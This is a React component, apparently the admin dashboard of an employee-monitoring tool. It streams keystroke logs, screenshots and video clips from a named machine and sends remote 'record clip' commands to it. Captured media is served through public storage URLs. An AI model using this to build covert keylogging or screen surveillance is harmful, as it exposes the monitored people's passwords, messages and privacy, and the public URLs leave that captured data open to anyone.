import { useEffect, useState } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import { ArrowLeft, Video, Keyboard, Image as ImageIcon, Play, Loader2 } from 'lucide-react';

export default function EmployeeDetail() {
    const { id } = useParams();
    const navigate = useNavigate();
    const [employee, setEmployee] = useState(null);
    const [keylogs, setKeylogs] = useState([]);
    const [screenshots, setScreenshots] = useState([]);
    const [videos, setVideos] = useState([]);
    const [requestingVideo, setRequestingVideo] = useState(false);

    useEffect(() => {
        fetchEmployee();
        fetchInitialData();

        const sub = supabase.channel(`employee-${id}`)
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'keylogs', filter: `employee_id=eq.${id}` },
                payload => setKeylogs(prev => [payload.new, ...prev]))
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'screenshots', filter: `employee_id=eq.${id}` },
                payload => setScreenshots(prev => [resolveUrl(payload.new, 'screenshots'), ...prev]))
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'videos', filter: `employee_id=eq.${id}` },
                payload => setVideos(prev => [resolveUrl(payload.new, 'videos'), ...prev]))
            .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'commands', filter: `employee_id=eq.${id}` },
                payload => {
                    if (payload.new.command_type === 'RECORD_CLIP' && payload.new.status === 'EXECUTED') {
                        setRequestingVideo(false);
                        alert("Video clip ready!");
                    }
                })
            .subscribe();

        return () => supabase.removeChannel(sub);
    }, [id]);

    const resolveUrl = (item, bucket) => ({
        ...item,
        publicUrl: item.url.startsWith('http') ? item.url : supabase.storage.from(bucket).getPublicUrl(item.storage_path).data.publicUrl
    });

    const fetchEmployee = async () => {
        const { data } = await supabase.from('employees').select('*').eq('id', id).single();
        if (data) setEmployee(data);
    };

    const fetchInitialData = async () => {
        const k = await supabase.from('keylogs').select('*').eq('employee_id', id).order('captured_at', { ascending: false }).limit(50);
        if (k.data) setKeylogs(k.data);

        const s = await supabase.from('screenshots').select('*').eq('employee_id', id).order('created_at', { ascending: false }).limit(20);
        if (s.data) setScreenshots(s.data.map(i => resolveUrl(i, 'screenshots')));

        const v = await supabase.from('videos').select('*').eq('employee_id', id).order('created_at', { ascending: false }).limit(10);
        if (v.data) setVideos(v.data.map(i => resolveUrl(i, 'videos')));
    };

    const requestVideoClip = async () => {
        setRequestingVideo(true);
        await supabase.from('commands').insert({
            employee_id: id,
            command_type: 'RECORD_CLIP',
            payload: {}
        });
    };

    if (!employee) return <div className="p-8">Loading...</div>;

    return (
        <div className="p-8 max-w-7xl mx-auto space-y-6">
            <div className="flex items-center justify-between">
                <button onClick={() => navigate('/')} className="flex items-center text-gray-500 hover:text-gray-900">
                    <ArrowLeft className="w-5 h-5 mr-1" /> Back
                </button>
                <div className="flex items-center gap-4">
                    <h1 className="text-2xl font-bold">{employee.hostname}</h1>
                    <button
                        onClick={requestVideoClip}
                        disabled={requestingVideo}
                        className={`flex items-center px-4 py-2 text-white rounded-lg transition ${requestingVideo ? 'bg-gray-400' : 'bg-red-600 hover:bg-red-700'}`}
                    >
                        {requestingVideo ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Video className="w-4 h-4 mr-2" />}
                        {requestingVideo ? 'Recording...' : 'Request 10s Clip'}
                    </button>
                </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">

                {/* Videos Column */}
                <div className="bg-white p-6 rounded-xl shadow border border-gray-100 lg:col-span-1">
                    <h2 className="text-lg font-semibold flex items-center mb-4 text-gray-700">
                        <Video className="w-5 h-5 mr-2" /> Video Clips
                    </h2>
                    <div className="space-y-4 max-h-[600px] overflow-y-auto">
                        {videos.map(vid => (
                            <div key={vid.id} className="border rounded p-2">
                                <video src={vid.publicUrl} controls className="w-full rounded bg-black" />
                                <span className="text-xs text-gray-500 block mt-1">{new Date(vid.created_at).toLocaleString()}</span>
                            </div>
                        ))}
                        {videos.length === 0 && <p className="text-gray-400">No videos yet.</p>}
                    </div>
                </div>

                {/* Screenshots Gallery */}
                <div className="bg-white p-6 rounded-xl shadow border border-gray-100 lg:col-span-1">
                    <h2 className="text-lg font-semibold flex items-center mb-4 text-gray-700">
                        <ImageIcon className="w-5 h-5 mr-2" /> Recent Screenshots
                    </h2>
                    <div className="grid grid-cols-2 gap-4 max-h-[600px] overflow-y-auto">
                        {screenshots.map(shot => (
                            <a key={shot.id} href={shot.publicUrl} target="_blank" rel="noreferrer" className="block group">
                                <div className="relative">
                                    <img src={shot.publicUrl} alt="Screenshot" className="w-full h-auto rounded border group-hover:opacity-90 transition" />
                                </div>
                                <span className="text-xs text-gray-500 block mt-1">{new Date(shot.created_at).toLocaleTimeString()}</span>
                            </a>
                        ))}
                        {screenshots.length === 0 && <p className="text-gray-400">No screenshots yet.</p>}
                    </div>
                </div>

                {/* Keylogs Feed */}
                <div className="bg-white p-6 rounded-xl shadow border border-gray-100 lg:col-span-1">
                    <h2 className="text-lg font-semibold flex items-center mb-4 text-gray-700">
                        <Keyboard className="w-5 h-5 mr-2" /> Live Keylogs
                    </h2>
                    <div className="bg-gray-50 p-4 rounded-lg font-mono text-sm h-[600px] overflow-y-auto space-y-4">
                        {keylogs.map(log => (
                            <div key={log.id} className="border-b border-gray-200 pb-2">
                                <span className="text-xs text-gray-400 block mb-1">{new Date(log.captured_at).toLocaleString()}</span>
                                <div className="whitespace-pre-wrap break-words">{log.content}</div>
                            </div>
                        ))}
                        {keylogs.length === 0 && <p className="text-gray-400">No logs yet.</p>}
                    </div>
                </div>
            </div>
        </div>
    );
}
